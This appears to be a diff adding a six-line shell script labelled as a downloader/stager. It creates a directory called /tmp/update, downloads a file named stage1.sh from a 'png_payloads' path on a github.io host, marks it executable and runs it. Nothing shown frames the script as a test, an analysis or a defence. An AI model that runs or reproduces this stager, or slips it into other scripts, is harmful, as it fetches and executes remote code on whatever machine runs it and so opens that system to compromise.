@@ -1,0 +1,6 @@
+# Shell downloader / stager
+
+mkdir -p /tmp/update
+curl -fsSL https://personfu.github.io/png_payloads/stage1.sh -o /tmp/update/stage1.sh
+chmod +x /tmp/update/stage1.sh
+bash /tmp/update/stage1.sh
